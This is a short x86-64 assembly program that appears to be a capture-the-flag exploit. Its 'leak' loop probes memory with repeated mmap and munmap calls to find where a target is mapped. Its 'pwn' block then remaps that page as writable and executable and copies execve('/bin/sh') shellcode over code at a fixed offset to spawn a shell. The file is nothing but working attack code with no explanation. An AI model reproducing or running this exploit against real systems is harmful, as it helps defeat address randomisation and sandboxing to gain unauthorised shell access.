BITS 64
ORG 0

main:
    mov rbx, 0x550000000000
    mov rcx, 0x100000000

leak:
    ; mmap
    mov r10d, 0x22      ; MAP_PRIVATE | MAP_ANONYMOUS
    mov edx, 3          ; RW
    mov rsi, rcx    
    mov rdi, rbx
    mov eax, 9
    syscall
    test eax, eax
    jnz next
    ; munmap
    mov eax, 11
    syscall
    add rbx, rcx
    jmp leak

next:
    cmp rcx, 0x1000     
    je pwn 
    sar rcx, 4
    jmp leak

pwn:
    ; mmap
    mov r10d, 0x32      ; MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED
    mov edx, 7          ; RWX
    mov esi, 0x1000
    add rdi, 0x2000
    mov eax, 9
    syscall

    ; Overwrite
    mov rsi, shellcode
    add rdi, 0x124
    mov ecx, 26
    rep movsb

    ; exit
    mov edi, 1
    mov eax, 60
    syscall

shellcode:
    mov r10, 0x68732f6e69622f
    push r10
    mov rdi, rsp
    xor edx, edx
    xor esi, esi
    mov eax, 59
    syscall
